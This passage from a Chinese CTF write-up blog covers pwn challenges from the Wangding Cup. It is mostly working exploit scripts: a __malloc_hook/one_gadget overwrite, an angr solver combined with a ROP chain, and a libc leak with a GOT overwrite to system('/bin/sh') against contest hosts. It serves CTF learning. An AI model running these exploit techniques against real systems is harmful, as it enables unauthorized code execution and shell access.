stack在heap上且紧挨着ld，与libc偏移固定，完成任意读和任意写。</li><li>直接打<code>__malloc_hook</code>为onegadget我在本地没打通，所以用了<code>realloc</code>来调栈帧。</li><li>最后因为binary直接退出是无法触发<code>__malloc_hook</code>的，所以需要读libc的<code>environ</code>拿到栈地址，然后改return address为<code>main</code>地址（这个地址在栈上也有）。</li><li>binary重新开始从<code>main</code>开始执行的时候，<code>malloc</code>调用<code>__malloc_hook</code>最后触发onegdaget。</li><li>这里code限制最长0x120，最后我的exp长度是刚好合适，一般来讲是足够用了。</li><li>然而只能本地打通，远程没打通，队里大哥的脚本直接打<code>__malloc_hook</code>为onegadget就通了（老倒霉蛋了），最后贴我自己的和队里大哥的脚本。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my exp (cannot get the remote shell)</span></span><br><span class="line"><span class="comment"># write __malloc_hook ==&gt; one_gadget</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffddeb00</span> / <span class="number">8</span>) <span class="comment"># get __malloc_hook address</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push to stack</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffddeaf8</span> / <span class="number">8</span>) <span class="comment"># get __realloc_hook address</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push to stack </span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># get heap address</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push to stack</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0x4f4ec9</span>) <span class="comment"># get onegadget address offset</span></span><br><span class="line">payload += p64(<span class="number">26</span>) <span class="comment"># get onegadget address</span></span><br><span class="line">payload += p64(<span class="number">11</span>) <span class="comment"># write __malloc_hook to onegadget</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push onegadget address to stack</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0x6ca87</span> - <span class="number">4</span>) <span class="comment"># get __libc_realloc + 4 address offset (compared with onegadget)</span></span><br><span class="line">payload += p64(<span class="number">26</span>)</span><br><span class="line">payload += p64(<span class="number">11</span>) <span class="comment"># write __libc_realloc to __malloc_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write ret address</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># get heap address</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push to stack</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0x21f0d8</span>) <span class="comment"># get environ address offset</span></span><br><span class="line">payload += p64(<span class="number">26</span>) <span class="comment"># get environ address</span></span><br><span class="line">payload += p64(<span class="number">9</span>) <span class="comment"># get stack address</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push to stack</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0xf0</span>) <span class="comment"># ret address offset</span></span><br><span class="line">payload += p64(<span class="number">26</span>) <span class="comment"># get ret address </span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push to stack</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment"># push to stack twice</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0x20</span>) <span class="comment"># offset to stack addres that store the main address</span></span><br><span class="line">payload += p64(<span class="number">25</span>) <span class="comment"># get stack address that store the main address</span></span><br><span class="line">payload += p64(<span class="number">9</span>) <span class="comment"># get main address</span></span><br><span class="line">payload += p64(<span class="number">11</span>) <span class="comment"># write ret address to main address</span></span><br><span class="line"></span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the remote shell</span></span><br><span class="line"><span class="comment"># code = ""</span></span><br><span class="line"><span class="comment"># #step 1</span></span><br><span class="line"><span class="comment"># code += p64(17)</span></span><br><span class="line"><span class="comment"># code += p64(1) + p64(0xf0)</span></span><br><span class="line"><span class="comment"># code += p64(26) </span></span><br><span class="line"><span class="comment"># code += p64(13) #push base</span></span><br><span class="line"><span class="comment"># code += p64(9) #get base_addr</span></span><br><span class="line"><span class="comment"># code += p64(13)</span></span><br><span class="line"><span class="comment"># code += p64(1) + p64(0x202020 - 0xe50)</span></span><br><span class="line"><span class="comment"># code += p64(25) # get stdout_addr</span></span><br><span class="line"><span class="comment"># code += p64(9)</span></span><br><span class="line"><span class="comment"># code += p64(13) #push stdout</span></span><br><span class="line"><span class="comment"># code += p64(1) + p64( 0x3c5620 - 0x3c4b10 )</span></span><br><span class="line"><span class="comment"># #code += p64(1) + p64(0x3ec760 - 0x3ebc30)</span></span><br><span class="line"><span class="comment"># code += p64(26) #get __malloc_hook addr</span></span><br><span class="line"><span class="comment"># code += p64(13) </span></span><br><span class="line"><span class="comment"># code +=p64(13)</span></span><br><span class="line"><span class="comment"># #one = 0x45216</span></span><br><span class="line"><span class="comment"># #one = 0x4526a</span></span><br><span class="line"><span class="comment"># one = 0xf02a4</span></span><br><span class="line"><span class="comment"># #one = 0xf1147</span></span><br><span class="line"><span class="comment"># '''2.27'''</span></span><br><span class="line"><span class="comment"># #one = 0x4f2c5</span></span><br><span class="line"><span class="comment"># #one = 0x4f322</span></span><br><span class="line"><span class="comment"># #one = 0x10a38c</span></span><br><span class="line"><span class="comment"># code+= p64(1) + p64(0x3c4b10 - one)</span></span><br><span class="line"><span class="comment"># #code+= p64(1) + p64(0x3ebc30 - one)</span></span><br><span class="line"><span class="comment"># code += p64(26)</span></span><br><span class="line"><span class="comment"># code += p64(11) #set __malloc_hook addr to one</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #set ret addr = main</span></span><br><span class="line"><span class="comment"># code += p64(1) + p64(8)</span></span><br><span class="line"><span class="comment"># code += p64(25)</span></span><br><span class="line"><span class="comment"># code += p64(13) #get ret_addr</span></span><br><span class="line"><span class="comment"># code += p64(13)</span></span><br><span class="line"><span class="comment"># code += p64(1) + p64(8)</span></span><br><span class="line"><span class="comment"># code += p64(26)</span></span><br><span class="line"><span class="comment"># code += p64(9)</span></span><br><span class="line"><span class="comment"># code += p64(13)</span></span><br><span class="line"><span class="comment"># code += p64(1) + p64(0x530 + 0x920 - 0x989)</span></span><br><span class="line"><span class="comment"># code += p64(26)</span></span><br><span class="line"><span class="comment"># code += p64(11)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># code += p64(30) #end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("code&gt;")</span></span><br><span class="line"><span class="comment"># p.send(code)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="faster0"><a href="#faster0" class="headerlink" title="faster0"></a>faster0</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>因为还没仔细看（看wp像是angr + rop），先贴个队里的wp，以后再来复现，学习一下。</p><h2 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h2><p>1.用angr解密码，大概花10s，题目有5分钟的时间，实际上还很多操作的时间，就分成两步来解</p><h2 id="exp-angr-part-py"><a href="#exp-angr-part-py" class="headerlink" title="exp (angr_part.py)"></a>exp (angr_part.py)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib, itertools, string, base64</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line">context(terminal = [<span class="string">'xfce4-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'zsh'</span>, <span class="string">'-c'</span>])</span><br><span class="line"></span><br><span class="line">token = <span class="string">"icqbd4092dd79915594a0db6985d85fd"</span></span><br><span class="line">HOST, PORT = <span class="string">"39.96.72.181"</span>, <span class="number">42732</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver</span><span class="params">(val, name)</span> :</span></span><br><span class="line">    alpha_set = string.printable</span><br><span class="line">    algorithm = getattr(hashlib, name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(alpha_set, <span class="number">4</span>) :</span><br><span class="line">        s = <span class="string">''</span>.join(i)</span><br><span class="line">        <span class="keyword">if</span> algorithm(s).hexdigest()[:<span class="number">20</span>] == val :</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    print(<span class="string">"GG not found..."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-11</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">val = p.recv(<span class="number">20</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;built-in function openssl_"</span>)</span><br><span class="line">name = p.recvuntil(<span class="string">"&gt;"</span>)[:<span class="number">-1</span>]</span><br><span class="line">print(<span class="string">"&#123;&#125; &amp; &#123;&#125;"</span>.format(val, name))</span><br><span class="line">res = solver(val, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, res)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input your token: "</span>, token)</span><br><span class="line">p.recvuntil(<span class="string">"Creating pwn file, please wait ...\n\n\n\n"</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">"\n\n\n"</span>)[:<span class="number">-3</span>]</span><br><span class="line">bindump = base64.b64decode(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"recv.tar.gz"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f :</span><br><span class="line">    f.write(bindump)</span><br><span class="line">os.system(<span class="string">"tar -zxf recv.tar.gz -C ./chal"</span>)</span><br><span class="line">os.system(<span class="string">"upx -d chal/pwn*"</span>)</span><br><span class="line">os.system(<span class="string">"mv chal/pwn* ./pwn-chal"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your docker run port ["</span>)</span><br><span class="line">port = int(p.recvuntil(<span class="string">"]"</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"password is \""</span>)</span><br><span class="line">password = p.recvuntil(<span class="string">"\""</span>)[:<span class="number">-1</span>]</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"port: &#123;&#125;, password: &#123;&#125;"</span>.format(port, password))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">binary: ./pwn-chal</span></span><br><span class="line"><span class="string">write analysis here...</span></span><br><span class="line"><span class="string">write exp in payload</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn-chal"</span>)</span><br><span class="line">load_segments = [x <span class="keyword">for</span> x <span class="keyword">in</span> elf.iter_segments() <span class="keyword">if</span> x.header.p_type == <span class="string">'PT_LOAD'</span>]</span><br><span class="line">code_segment = load_segments[<span class="number">0</span>]</span><br><span class="line">code = elf.read(code_segment.header.p_paddr,code_segment.header.p_filesz)</span><br><span class="line"></span><br><span class="line">sub = <span class="string">"\x55\x48\x89\xe5\x8b\x05"</span></span><br><span class="line">func_list = []</span><br><span class="line">index = code.find(sub)</span><br><span class="line"><span class="keyword">while</span> index != <span class="number">-1</span>:</span><br><span class="line"> func_list.append(index+<span class="number">0x400000</span>)</span><br><span class="line"> index = code.find(sub,index+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func_list.append(<span class="number">0x405ef7</span>)</span><br><span class="line"><span class="comment">#for i in func_list:</span></span><br><span class="line"><span class="comment"># print hex(i)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(q, i, start_address, success_address)</span>:</span></span><br><span class="line">start = time.clock()</span><br><span class="line">path_to_binary = <span class="string">'./pwn-chal'</span></span><br><span class="line">project = angr.Project(path_to_binary)</span><br><span class="line">initial_state = project.factory.blank_state(addr=start_address+<span class="number">34</span>)<span class="comment">#,angr.options.unicorn])</span></span><br><span class="line">simulation = project.factory.simulation_manager(initial_state)</span><br><span class="line"><span class="comment">#simulation.use_technique(angr.exploration_techniques.DFS())</span></span><br><span class="line">res = simulation.explore(find=success_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(res.found) &gt; <span class="number">0</span>:</span><br><span class="line">solution = res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line">elapsed = (time.clock() - start)</span><br><span class="line">print(<span class="string">"Here used:"</span>,str(i), <span class="string">" "</span>, elapsed,<span class="string">" "</span>,solution) </span><br><span class="line">q.put(str(i)+<span class="string">'  '</span> + solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = multiprocessing.Queue()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line"> p = multiprocessing.Process(target = solve, args = (q, i, func_list[i], func_list[i+<span class="number">1</span>] ))</span><br><span class="line"> p.start()</span><br><span class="line"> <span class="comment">#_thread.start_new_thread( solve, (func_list[i+1], func_list[i], ) )</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">ans_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line"> ans_list.append(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span> count != <span class="number">100</span>:</span><br><span class="line"> ans = q.get(<span class="literal">True</span>)</span><br><span class="line"> count = count + <span class="number">1</span></span><br><span class="line"> ans_list[int(ans[:<span class="number">3</span>])] = int(ans[<span class="number">3</span>:])</span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans_list:</span><br><span class="line"> ans += str(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####connect to docker</span></span><br><span class="line">p = remote(HOST, port)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your password: "</span>, password)</span><br><span class="line"></span><br><span class="line">payload = ans</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#padding = 0x0</span></span><br><span class="line"><span class="comment">#rop_chain = "A" * padding + "BBBB"</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000406011</span></span><br><span class="line">pop_rsp = <span class="number">0x0000000000406620</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000406013</span></span><br><span class="line">write = <span class="number">0x400640</span></span><br><span class="line">rop_chain = p64(pop_rsi_r15) + p64(<span class="number">0x00609048</span>) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write) + p64(<span class="number">0x405ef7</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"WOW,U R GREAT !"</span>, rop_chain)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="exp-rop-part-py"><a href="#exp-rop-part-py" class="headerlink" title="exp (rop_part.py)"></a>exp (rop_part.py)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot; dydxh &#x2F; AAA &quot;&quot;&quot;</span><br><span class="line">from pwn import *</span><br><span class="line">import sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;, log_level &#x3D; &#39;debug&#39;)</span><br><span class="line">context(terminal &#x3D; [&#39;xfce4-terminal&#39;, &#39;-x&#39;, &#39;zsh&#39;, &#39;-c&#39;])</span><br><span class="line"></span><br><span class="line">def _base(_name) :</span><br><span class="line">    _vmmap &#x3D; open(&#39;&#x2F;proc&#x2F;%d&#x2F;maps&#39; % p.proc.pid).read()</span><br><span class="line">    _regex &#x3D; &#39;^.*r-xp.*&#123;&#125;.*$&#39;.format(_name)</span><br><span class="line">    _line &#x3D; [_ for _ in _vmmap.split(&#39;\n&#39;) if re.match(_regex, _)][0]</span><br><span class="line">    return int(_line.split(&#39;-&#39;)[0], 16)</span><br><span class="line"></span><br><span class="line">def _text(_name, elf) :</span><br><span class="line">    return _base(_name) + elf.get_section_by_name(&quot;.text&quot;).header[&quot;sh_offset&quot;]</span><br><span class="line"></span><br><span class="line">def _setup_env() :</span><br><span class="line">    env &#x3D; dict(os.environ)</span><br><span class="line">    if not elf.statically_linked :</span><br><span class="line">        target_ld &#x3D; &#39;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2&#39;</span><br><span class="line">        forged_ld &#x3D; &#39;&#x2F;lib64&#x2F;ld-linux-x86-64.so.9&#39;</span><br><span class="line">        os.system(&#39;sudo ln -fs %s %s&#39; % (target_ld, forged_ld))</span><br><span class="line">        env[&#39;LD_PRELOAD&#39;] &#x3D; _libc</span><br><span class="line">    return env</span><br><span class="line"></span><br><span class="line">_proc &#x3D; os.path.abspath(&#39;.&#x2F;pwn-chal&#39;)</span><br><span class="line">_libc &#x3D; os.path.abspath(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">_pwn_remote &#x3D; (sys.argv[1] &#x3D;&#x3D; &#39;r&#39;) if len(sys.argv) &gt; 1 else 0</span><br><span class="line">_debug &#x3D; int(sys.argv[1]) if len(sys.argv) &gt; 1 and _pwn_remote &#x3D;&#x3D; 0 else 0</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(_libc)</span><br><span class="line">elf &#x3D; ELF(_proc)</span><br><span class="line"></span><br><span class="line">def F() :</span><br><span class="line">    if _debug &#x3D;&#x3D; 0 :</span><br><span class="line">        return</span><br><span class="line">    _source &#x3D; &quot;init\n&quot;</span><br><span class="line">    if elf.pie :</span><br><span class="line">        _offset, _bps &#x3D; _base(_proc), []</span><br><span class="line">        # _bps.append(0x123)</span><br><span class="line">        _source +&#x3D; &#39;\n&#39;.join([&#39;b *&#123;&#125;&#39;.format(hex(_offset + _)) for _ in _bps])</span><br><span class="line">    else :</span><br><span class="line">        _source +&#x3D; &#39;b *0x405F4B\n&#39;</span><br><span class="line">        _source +&#x3D; &#39;b *0x405F44\n&#39;</span><br><span class="line">        _source +&#x3D; &#39;source peda-session-pwn-patch.txt&#39;</span><br><span class="line">    if os.path.exists(&#39;pwn-patch.dbg&#39;) :</span><br><span class="line">        _source &#x3D; &#39;add-symbol-file pwn-patch.dbg -readnow &#123;&#125;\n&#39;.format(hex(_text(_proc, elf))) + _source</span><br><span class="line">    gdb.attach(p, gdbscript&#x3D;_source)</span><br><span class="line"></span><br><span class="line">if _pwn_remote &#x3D;&#x3D; 0 :</span><br><span class="line">    p &#x3D; process(argv&#x3D;[_proc], env&#x3D;_setup_env())</span><br><span class="line">else :</span><br><span class="line">    p &#x3D; remote(&#39;39.96.72.181&#39;, 20641)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F()</span><br><span class="line">password &#x3D; &quot;bb4a6af3-873a-45b3-8e62-3e787c50e7a7&quot;</span><br><span class="line">p.sendlineafter(&quot;Please input your password: &quot;, password)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;7039817158683274402289917413926034143571667795003373218412797531063016417633197047729195392035080799&quot;)</span><br><span class="line"></span><br><span class="line">vuln_func &#x3D; 0x405EF7</span><br><span class="line">read_int &#x3D; 0x400841</span><br><span class="line">write_got &#x3D; 0x609018</span><br><span class="line">atoi_got &#x3D; 0x609048</span><br><span class="line">write_plt &#x3D; 0x400640</span><br><span class="line">read_plt &#x3D; 0x400680</span><br><span class="line">pop_rdi &#x3D; 0x406013</span><br><span class="line">pop_rsi_r15 &#x3D; 0x406011</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">0x0000000000406013 : pop rdi ; ret</span><br><span class="line">0x0000000000406011 : pop rsi ; pop r15 ; ret</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;A&quot; * 0xd8</span><br><span class="line">payload +&#x3D; flat([pop_rdi, 0x1, pop_rsi_r15, write_got, 0, write_plt, vuln_func])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;WOW,U R GREAT !\n&quot;, payload)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u64(p.recv(8))</span><br><span class="line">system_addr &#x3D; write_addr - libc.symbols[&quot;write&quot;] + libc.symbols[&quot;system&quot;]</span><br><span class="line">print(&quot;system addr: 0x&#123;:x&#125;&quot;.format(system_addr))</span><br><span class="line"># system_addr &#x3D; write_addr - 0x111300 + 0x554e0</span><br><span class="line"></span><br><span class="line">sleep(1.0)</span><br><span class="line">p.send(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;A&quot; * 0xd8</span><br><span class="line">payload +&#x3D; flat([pop_rdi, 0x0, pop_rsi_r15, atoi_got, 0, read_plt, read_int])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;WOW,U R GREAT !\n&quot;, payload)</span><br><span class="line"></span><br><span class="line">sleep(1.0)</span><br><span class="line">p.sendline(p64(system_addr))</span><br><span class="line"></span><br><span class="line">sleep(1.0)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">#flag&#123;ab43fc1f9375d099ad6d6b4430b25eab&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>第一次打网鼎，无力吐槽，出题稀烂不说，flag的py满天飞，卖flag的操作都有。最后队伍拿了第十，感觉自己没啥贡献，希望线下赛再好好打吧。</p>]]></content>
    
    <summary type="html">
